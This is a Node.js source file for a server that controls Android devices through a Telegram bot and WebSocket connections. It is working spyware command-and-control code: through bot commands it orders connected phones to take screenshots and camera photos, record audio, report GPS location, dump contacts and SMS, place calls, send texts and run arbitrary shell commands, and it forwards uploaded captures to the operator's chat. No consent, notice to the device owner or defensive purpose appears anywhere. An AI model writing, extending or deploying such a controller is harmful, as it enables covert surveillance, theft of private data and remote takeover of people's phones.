require('dotenv').config();
const express = require('express');
const WebSocket = require('ws');
const http = require('http');
const https = require('https');
const TelegramBot = require('node-telegram-bot-api');
const multer = require('multer');
const fs = require('fs');
const path = require('path');
const { v4: uuidv4 } = require('uuid');
const helmet = require('helmet');

// ============================================
// CONFIGURATION
// ============================================
const token = process.env.TELEGRAM_BOT_TOKEN;
const adminId = process.env.TELEGRAM_CHAT_ID;
const PORT = process.env.PORT || 8999;

if (!token) {
    console.error('❌ TELEGRAM_BOT_TOKEN not set');
    process.exit(1);
}

const app = express();
const server = http.createServer(app);
const wss = new WebSocket.Server({ server, clientTracking: true });

app.set('trust proxy', 1);
app.use(helmet({ contentSecurityPolicy: false }));
app.use(express.json({ limit: '50mb' }));

// ============================================
// DATA STORAGE
// ============================================
const connectedDevices = new Map();
const userSessions = new Map();
let bot = null;

// ============================================
// DIRECTORY SETUP
// ============================================
['uploads', 'screenshots', 'recordings', 'photos'].forEach(dir => {
    if (!fs.existsSync(dir)) fs.mkdirSync(dir, { recursive: true });
});

// ============================================
// FILE UPLOAD
// ============================================
const storage = multer.diskStorage({
    destination: (req, file, cb) => {
        const type = req.headers['file-type'] || 'file';
        let dir = 'uploads';
        if (type.includes('screenshot')) dir = 'screenshots';
        else if (type.includes('audio')) dir = 'recordings';
        else if (type.includes('photo')) dir = 'photos';
        cb(null, dir);
    },
    filename: (req, file, cb) => {
        const deviceId = req.headers['device-id'] || 'unknown';
        const timestamp = Date.now();
        const ext = path.extname(file.originalname);
        cb(null, `${deviceId}_${timestamp}${ext}`);
    }
});

const upload = multer({ 
    storage, 
    limits: { fileSize: 100 * 1024 * 1024 } 
});

// ============================================
// TELEGRAM BOT SETUP
// ============================================
async function startBot() {
    bot = new TelegramBot(token, { 
        polling: true,
        onlyFirstMatch: true,
        filepath: false
    });

    await bot.setMyCommands([
        { command: 'start', description: '🚀 Start DMA bot' },
        { command: 'list', description: '📱 List devices' },
        { command: 'info', description: 'ℹ️ Device info' },
        { command: 'screenshot', description: '📸 Take screenshot' },
        { command: 'camera', description: '📷 Take photo (front/rear)' },
        { command: 'record', description: '🎤 Record audio (seconds)' },
        { command: 'stop', description: '⏹️ Stop recording' },
        { command: 'location', description: '📍 Get location' },
        { command: 'contacts', description: '📒 Get contacts' },
        { command: 'apps', description: '📱 List apps' },
        { command: 'call', description: '📞 Make call (number)' },
        { command: 'sms', description: '💬 Send SMS (number + text)' },
        { command: 'messages', description: '📨 Get messages' },
        { command: 'shell', description: '🖥️ Run command' },
        { command: 'help', description: '❓ Help' }
    ]);

    console.log('✅ Bot ready');
    setupBotHandlers();
    return bot;
}

// ============================================
// WEBSOCKET SERVER
// ============================================
wss.on('connection', (ws, req) => {
    const deviceId = req.headers['device-id'];
    const deviceModel = req.headers['device-model'] || 'Unknown';
    
    if (!deviceId) {
        return ws.close(1008, 'No Device ID');
    }

    console.log(`✅ Device connected: ${deviceId} (${deviceModel})`);
    
    ws.deviceId = deviceId;
    connectedDevices.set(deviceId, { 
        ws, 
        info: { id: deviceId, model: deviceModel },
        lastSeen: Date.now()
    });

    if (bot) {
        bot.sendMessage(adminId, `📱 Connected: ${deviceModel}\n\`${deviceId}\``, 
            { parse_mode: 'Markdown' });
    }

    ws.on('message', (data) => {
        try {
            const msg = JSON.parse(data);
            handleDeviceMessage(deviceId, msg);
        } catch (e) {}
    });

    ws.on('close', () => {
        connectedDevices.delete(deviceId);
        if (bot) {
            bot.sendMessage(adminId, `📴 Disconnected: \`${deviceId}\``, 
                { parse_mode: 'Markdown' });
        }
        console.log(`❌ Device disconnected: ${deviceId}`);
    });

    // Send initial command
    ws.send(JSON.stringify({
        type: 'command',
        id: uuidv4(),
        command: 'get_device_info',
        timestamp: Date.now()
    }));
});

// ============================================
// DEVICE MESSAGE HANDLER
// ============================================
function handleDeviceMessage(deviceId, message) {
    if (message.type === 'response' && message.data) {
        handleCommandResponse(deviceId, message);
    } else if (message.type === 'device_info') {
        const device = connectedDevices.get(deviceId);
        if (device) {
            device.info = { ...device.info, ...message.data };
        }
    }
}

function handleCommandResponse(deviceId, response) {
    if (!bot) return;
    
    const device = connectedDevices.get(deviceId);
    const model = device?.info?.model?.split(' ')[0] || deviceId.substring(0, 8);
    
    if (!response.success) {
        bot.sendMessage(adminId, `❌ Failed: ${model}\n${response.error || 'Unknown error'}`);
        return;
    }

    // Location
    if (response.data?.lat && response.data?.lng) {
        bot.sendLocation(adminId, response.data.lat, response.data.lng);
        bot.sendMessage(adminId, 
            `📍 ${model}\nLat: ${response.data.lat}\nLng: ${response.data.lng}`);
    }
    
    // Device info
    else if (response.data?.device) {
        const msg = 
`📱 ${response.data.model || model}
Android: ${response.data.android || '?'} (SDK ${response.data.sdk || '?'})
Battery: ${response.data.battery?.toFixed(0) || '?'}%
Storage: ${formatBytes(response.data.internal_free)} free
Apps: ${response.data.apps_count || 0}`;
        bot.sendMessage(adminId, msg);
    }
    
    // Contacts
    else if (response.data?.contacts) {
        try {
            const contacts = JSON.parse(response.data.contacts);
            let msg = `📒 Contacts: ${contacts.length}\n`;
            contacts.slice(0, 20).forEach((c, i) => {
                msg += `${i+1}. ${c.name || '?'}: ${c.number}\n`;
            });
            sendLongMessage(adminId, msg);
        } catch (e) {}
    }
    
    // Apps
    else if (response.data?.apps) {
        try {
            const apps = JSON.parse(response.data.list);
            bot.sendMessage(adminId, `📱 Apps: ${response.data.count || apps.length}`);
        } catch (e) {}
    }
    
    // Call/SMS
    else if (response.data?.call_made) {
        bot.sendMessage(adminId, `📞 Called ${response.data.number}`);
    }
    else if (response.data?.sms_sent) {
        bot.sendMessage(adminId, `💬 SMS sent to ${response.data.number}`);
    }
    
    // Messages
    else if (response.data?.messages) {
        bot.sendMessage(adminId, `📨 Messages received`);
    }
    
    // Files
    else if (response.data?.files) {
        try {
            const files = JSON.parse(response.data.files);
            bot.sendMessage(adminId, `📁 ${response.data.path || '/'}: ${files.length} items`);
        } catch (e) {}
    }
    
    // Shell output
    else if (response.output) {
        const out = response.output.substring(0, 500);
        bot.sendMessage(adminId, `🖥️ Output:\n${out}`);
    }
    
    // Default
    else {
        bot.sendMessage(adminId, `✅ ${model}: Command executed`);
    }
}

// ============================================
// SEND COMMAND TO DEVICE - FIXED DEVICE LOOKUP
// ============================================
function sendCommandToDevice(deviceId, command, data = {}) {
    // Try exact match first
    let device = connectedDevices.get(deviceId);
    
    // If not found, try case-insensitive match
    if (!device) {
        const lowerId = deviceId.toLowerCase();
        for (let [id, dev] of connectedDevices.entries()) {
            if (id.toLowerCase() === lowerId) {
                device = dev;
                deviceId = id;
                break;
            }
        }
    }
    
    // If still not found, try partial match (last 8 chars)
    if (!device && deviceId.length > 8) {
        const suffix = deviceId.slice(-8);
        for (let [id, dev] of connectedDevices.entries()) {
            if (id.includes(suffix)) {
                device = dev;
                deviceId = id;
                break;
            }
        }
    }
    
    if (!device) {
        console.error(`Device not found: ${deviceId}`);
        return false;
    }
    
    const cmdObj = {
        type: 'command',
        id: uuidv4(),
        command: command,
        data: data,
        timestamp: Date.now()
    };
    
    try {
        device.ws.send(JSON.stringify(cmdObj));
        return true;
    } catch (e) {
        return false;
    }
}

// ============================================
// BOT COMMAND HANDLERS
// ============================================
function setupBotHandlers() {
    
    // === START ===
    bot.onText(/\/start/, (msg) => {
        const chatId = msg.chat.id;
        if (chatId.toString() !== adminId) return;
        
        const count = connectedDevices.size;
        bot.sendMessage(chatId, 
            `🤖 DMA Bot\nDevices: ${count}\nType /help for commands`);
    });

    // === HELP ===
    bot.onText(/\/help/, (msg) => {
        const chatId = msg.chat.id;
        if (chatId.toString() !== adminId) return;
        
        const help = 
`📱 Commands - NO DEVICE ID NEEDED!

First, select a device:
/list - Show all devices
Then use device number: /select 1

Media:
/screenshot - Take screenshot
/camera front|rear - Take photo
/record 10 - Record 10s
/stop - Stop recording

Location:
/location - Get GPS

Data:
/contacts - Get contacts
/apps - List apps
/messages - Get SMS

Communication:
/call 1234567890 - Make call
/sms 1234567890 Hello - Send SMS

System:
/shell ls - Run command
/info - Device info`;
        
        bot.sendMessage(chatId, help);
    });

    // === LIST DEVICES ===
    bot.onText(/\/list/, (msg) => {
        const chatId = msg.chat.id;
        if (chatId.toString() !== adminId) return;
        
        if (connectedDevices.size === 0) {
            return bot.sendMessage(chatId, '📭 No devices connected');
        }
        
        let text = `📱 Devices (${connectedDevices.size}):\n`;
        let index = 1;
        connectedDevices.forEach((device, id) => {
            const model = device.info?.model?.split(' ')[0] || 'Android';
            text += `${index}. ${model} - \`${id}\`\n`;
            index++;
        });
        text += `\nUse /select 1 to choose device`;
        
        bot.sendMessage(chatId, text, { parse_mode: 'Markdown' });
    });

    // === SELECT DEVICE ===
    const activeDevice = new Map();
    
    bot.onText(/\/select (\d+)/, (msg, match) => {
        const chatId = msg.chat.id;
        if (chatId.toString() !== adminId) return;
        
        const index = parseInt(match[1]) - 1;
        const devices = Array.from(connectedDevices.entries());
        
        if (index >= 0 && index < devices.length) {
            const [deviceId, device] = devices[index];
            activeDevice.set(chatId, deviceId);
            const model = device.info?.model?.split(' ')[0] || 'Device';
            bot.sendMessage(chatId, `✅ Selected: ${model}\nNow using: \`${deviceId}\``, 
                { parse_mode: 'Markdown' });
        } else {
            bot.sendMessage(chatId, '❌ Invalid device number');
        }
    });

    // === INFO ===
    bot.onText(/\/info/, async (msg) => {
        const chatId = msg.chat.id;
        if (chatId.toString() !== adminId) return;
        
        const deviceId = activeDevice.get(chatId);
        if (!deviceId) {
            return bot.sendMessage(chatId, '❌ No device selected. Use /list then /select N');
        }
        
        sendCommandToDevice(deviceId, 'get_device_info');
        bot.sendMessage(chatId, 'ℹ️ Getting device info...');
    });

    // === SCREENSHOT ===
    bot.onText(/\/screenshot/, async (msg) => {
        const chatId = msg.chat.id;
        if (chatId.toString() !== adminId) return;
        
        const deviceId = activeDevice.get(chatId);
        if (!deviceId) {
            return bot.sendMessage(chatId, '❌ No device selected. Use /list then /select N');
        }
        
        sendCommandToDevice(deviceId, 'take_screenshot');
        bot.sendMessage(chatId, '📸 Taking screenshot...');
    });

    // === CAMERA ===
    bot.onText(/\/camera (.+)/, async (msg, match) => {
        const chatId = msg.chat.id;
        if (chatId.toString() !== adminId) return;
        
        const deviceId = activeDevice.get(chatId);
        if (!deviceId) {
            return bot.sendMessage(chatId, '❌ No device selected');
        }
        
        const type = match[1].toLowerCase();
        const cameraType = type.includes('front') ? 'front' : 'rear';
        
        sendCommandToDevice(deviceId, 'take_photo', { camera: cameraType });
        bot.sendMessage(chatId, `📷 Taking ${cameraType} photo...`);
    });

    // === RECORD - FIXED ===
    bot.onText(/\/record(?:\s+(\d+))?/, async (msg, match) => {
        const chatId = msg.chat.id;
        if (chatId.toString() !== adminId) return;
        
        const deviceId = activeDevice.get(chatId);
        if (!deviceId) {
            return bot.sendMessage(chatId, '❌ No device selected. Use /list then /select N');
        }
        
        const seconds = match[1] ? parseInt(match[1]) : 10;
        sendCommandToDevice(deviceId, 'record_audio', { seconds });
        bot.sendMessage(chatId, `🎤 Recording ${seconds}s... (Use /stop to stop early)`);
    });

    // === STOP RECORDING ===
    bot.onText(/\/stop/, async (msg) => {
        const chatId = msg.chat.id;
        if (chatId.toString() !== adminId) return;
        
        const deviceId = activeDevice.get(chatId);
        if (!deviceId) {
            return bot.sendMessage(chatId, '❌ No device selected');
        }
        
        sendCommandToDevice(deviceId, 'stop_recording');
        bot.sendMessage(chatId, '⏹️ Stopping recording...');
    });

    // === LOCATION ===
    bot.onText(/\/location/, async (msg) => {
        const chatId = msg.chat.id;
        if (chatId.toString() !== adminId) return;
        
        const deviceId = activeDevice.get(chatId);
        if (!deviceId) {
            return bot.sendMessage(chatId, '❌ No device selected');
        }
        
        sendCommandToDevice(deviceId, 'get_location');
        bot.sendMessage(chatId, '📍 Getting location...');
    });

    // === CONTACTS ===
    bot.onText(/\/contacts/, async (msg) => {
        const chatId = msg.chat.id;
        if (chatId.toString() !== adminId) return;
        
        const deviceId = activeDevice.get(chatId);
        if (!deviceId) {
            return bot.sendMessage(chatId, '❌ No device selected');
        }
        
        sendCommandToDevice(deviceId, 'list_contacts');
        bot.sendMessage(chatId, '📒 Getting contacts...');
    });

    // === APPS ===
    bot.onText(/\/apps/, async (msg) => {
        const chatId = msg.chat.id;
        if (chatId.toString() !== adminId) return;
        
        const deviceId = activeDevice.get(chatId);
        if (!deviceId) {
            return bot.sendMessage(chatId, '❌ No device selected');
        }
        
        sendCommandToDevice(deviceId, 'list_apps');
        bot.sendMessage(chatId, '📱 Getting apps...');
    });

    // === CALL ===
    bot.onText(/\/call (.+)/, async (msg, match) => {
        const chatId = msg.chat.id;
        if (chatId.toString() !== adminId) return;
        
        const deviceId = activeDevice.get(chatId);
        if (!deviceId) {
            return bot.sendMessage(chatId, '❌ No device selected');
        }
        
        const number = match[1].trim();
        sendCommandToDevice(deviceId, 'make_call', { number });
        bot.sendMessage(chatId, `📞 Calling ${number}...`);
    });

    // === SMS ===
    bot.onText(/\/sms (.+) (.+)/, async (msg, match) => {
        const chatId = msg.chat.id;
        if (chatId.toString() !== adminId) return;
        
        const deviceId = activeDevice.get(chatId);
        if (!deviceId) {
            return bot.sendMessage(chatId, '❌ No device selected');
        }
        
        const number = match[1].trim();
        const message = match[2].trim();
        sendCommandToDevice(deviceId, 'send_sms', { number, message });
        bot.sendMessage(chatId, `💬 Sending SMS to ${number}...`);
    });

    // === MESSAGES ===
    bot.onText(/\/messages/, async (msg) => {
        const chatId = msg.chat.id;
        if (chatId.toString() !== adminId) return;
        
        const deviceId = activeDevice.get(chatId);
        if (!deviceId) {
            return bot.sendMessage(chatId, '❌ No device selected');
        }
        
        sendCommandToDevice(deviceId, 'get_messages');
        bot.sendMessage(chatId, '📨 Getting messages...');
    });

    // === SHELL ===
    bot.onText(/\/shell (.+)/, async (msg, match) => {
        const chatId = msg.chat.id;
        if (chatId.toString() !== adminId) return;
        
        const deviceId = activeDevice.get(chatId);
        if (!deviceId) {
            return bot.sendMessage(chatId, '❌ No device selected');
        }
        
        const command = match[1].trim();
        sendCommandToDevice(deviceId, 'execute', { cmd: command });
        bot.sendMessage(chatId, `🖥️ Executing: ${command}`);
    });
}

// ============================================
// HELPER FUNCTIONS
// ============================================
function formatBytes(bytes) {
    if (bytes === 0) return '0 B';
    const k = 1024;
    const sizes = ['B', 'KB', 'MB', 'GB'];
    const i = Math.floor(Math.log(bytes) / Math.log(k));
    return parseFloat((bytes / Math.pow(k, i)).toFixed(1)) + ' ' + sizes[i];
}

async function sendLongMessage(chatId, text) {
    const MAX = 4096;
    if (text.length <= MAX) {
        await bot.sendMessage(chatId, text);
    } else {
        const tempFile = path.join(__dirname, `temp_${Date.now()}.txt`);
        fs.writeFileSync(tempFile, text);
        await bot.sendDocument(chatId, tempFile);
        fs.unlinkSync(tempFile);
    }
}

// ============================================
// API ENDPOINTS
// ============================================
app.post('/api/upload', upload.single('file'), async (req, res) => {
    try {
        const deviceId = req.headers['device-id'];
        const fileType = req.headers['file-type'] || 'file';
        
        if (!deviceId || !req.file) {
            return res.status(400).json({ error: 'Missing data' });
        }
        
        if (bot) {
            await bot.sendDocument(adminId, req.file.path, {
                caption: `📁 From: ${deviceId.substring(0, 8)}...\nType: ${fileType}`
            });
            
            // Clean up after 1 minute
            setTimeout(() => {
                if (fs.existsSync(req.file.path)) fs.unlinkSync(req.file.path);
            }, 60000);
        }
        
        res.json({ success: true });
        
    } catch (error) {
        res.status(500).json({ error: 'Upload failed' });
    }
});

app.get('/health', (req, res) => {
    res.json({
        status: 'ok',
        devices: connectedDevices.size,
        uptime: process.uptime()
    });
});

// ============================================
// START SERVER
// ============================================
server.listen(PORT, '0.0.0.0', async () => {
    console.log('\n🚀 DMA Server');
    console.log('━━━━━━━━━━━━━━━━━━━━━');
    console.log(`📡 Port: ${PORT}`);
    
    try {
        await startBot();
        console.log(`🤖 Bot: ✅ Connected`);
    } catch (e) {
        console.log(`🤖 Bot: ❌ Failed`);
    }
    
    console.log('━━━━━━━━━━━━━━━━━━━━━\n');
});

process.on('SIGTERM', shutdown);
process.on('SIGINT', shutdown);

function shutdown() {
    console.log('\n🛑 Shutting down...');
    if (bot) bot.stopPolling();
    wss.close();
    server.close(() => process.exit(0));
}

module.exports = { app, server, wss, connectedDevices };
